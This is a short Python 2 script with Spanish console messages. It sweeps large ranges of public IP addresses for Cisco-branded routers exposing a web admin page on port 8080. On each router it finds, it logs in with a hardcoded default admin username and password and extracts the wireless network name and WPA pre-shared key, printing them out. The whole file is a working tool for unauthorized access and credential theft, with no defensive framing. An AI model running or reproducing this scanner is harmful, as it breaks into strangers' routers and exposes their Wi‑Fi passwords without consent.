# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import socket

cisco=0
f = open("routers.csv", 'a+')
for i in range(180,202):
    i=i+1
    c=str(i)
    for j in range(49,255):
        j=j+1
        l=str(j)
        for p in range(0,255):
            p=p+1
            m=str(p)
            for a in range(0,255):
                a=a+1
                g=str(a)
                
                h=c+"."+l+"."+m+"."+g
                
                try:
                    print 'probando %s'%h
                    
                    r=requests.get('http://'+str(h)+':8080/wlanBasic.asp', timeout=1.5)
                    head=r.headers
                    b='WWW-Authenticate' in head
                    if b==True:
                        
                        r1=requests.get('http://'+str(h)+':8080/wlanBasic.asp', timeout=None)
                        n=r1.headers['WWW-Authenticate']=='Basic realm="Cisco"'
            
                        if n:
                            print str(h)+'...............'+str(r1.headers['WWW-Authenticate'])
                #print 'ok 1'
                            cisco=cisco+1
                #print ip+str(i)
                            r1=requests.get('http://'+str(h)+':8080/wlanBasic.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None)
                            #r2=requests.get('http://'+str(h)+':8080/wlanSecurity.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
                            r3=requests.get('http://'+str(h)+':8080/wlanSecurity.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None)
                            
                #print 'ok 2'
                
                            a=r1.content
                            j=r3.content
                            bs=BeautifulSoup(a, 'html.parser')
                            bs1=BeautifulSoup(j, 'html.parser',from_encoding="iso-8859-1")
                            for ssid in bs.find_all("input", {'name':"ServiceSetIdentifier"}):
                                for pwd in bs1.find_all("input",{'name':"WpaPreSharedKey"}):
                                    print str(h)+'..........'+ssid['value']+'..............'+pwd['value']
                            
                                
                    
                except :
                    pass
            #r2=requests.get('http://'+ip+':8080/wlanSecurity.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
                #except requests.exceptions.ConnectTimeout:
                 #   pass
                #except requests.exceptions.ReadTimeout:
                 #   pass
                #except requests.exceptions.ConnectionError:
                 #   pass
                #except KeyError:
                 #   pass

print str(cisco)+' routers cisco encontrados'